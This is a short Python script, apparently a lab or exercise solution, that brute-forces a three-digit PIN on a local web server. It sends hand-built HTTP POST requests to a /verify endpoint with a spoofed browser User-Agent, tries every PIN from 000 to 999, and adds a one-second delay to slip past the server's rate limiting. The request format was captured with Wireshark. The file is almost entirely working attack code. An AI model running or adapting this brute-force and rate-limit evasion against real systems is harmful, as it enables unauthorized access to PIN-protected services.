#the time i try to input a pin to the browser site of the server then enter, go to the wireshark and found the PUSH body
#use the PUsH body and result of getting the right PIN to open the server
import socket
import time

#host and port of the server
host = "127.0.0.1"
port = 8888

#the fuction for sending and recieving
def send_request(pin):
    #the one that creating socket object
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        
        #the http body and headers
        request = f"POST /verify HTTP/1.1\r\n"
        request += f"Host: {host}:{port}\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += "Cache-Control: max-age=0\r\n"
        request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\r\n"
        request += f"Content-Length: {len(f'magicNumber={pin}')}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
        request += "\r\n"
        request += f"magicNumber={pin}\r\n"
        
        #send to the server request
        s.sendall(request.encode())
        
        #response or recieve from the server
        response = s.recv(4096).decode()
        return response

#loop for guessing the pin from 000 to 999
for i in range(1000):
    pin = f"{i:03}"
    
    print(f"Trying PIN: {pin}")
    
    #sending result to the server pin security
    response = send_request(pin)
    
    #cheacking if the guessing number is correct or failed
    if "Incorrect number" not in response:
        print(f"Success! The correct PIN is: {pin}")
        break
    else:
        print(f"Failed attempt: {pin}")
    
    #adding deley to fix the problem of "wow, slow down" response of the server
    time.sleep(1)
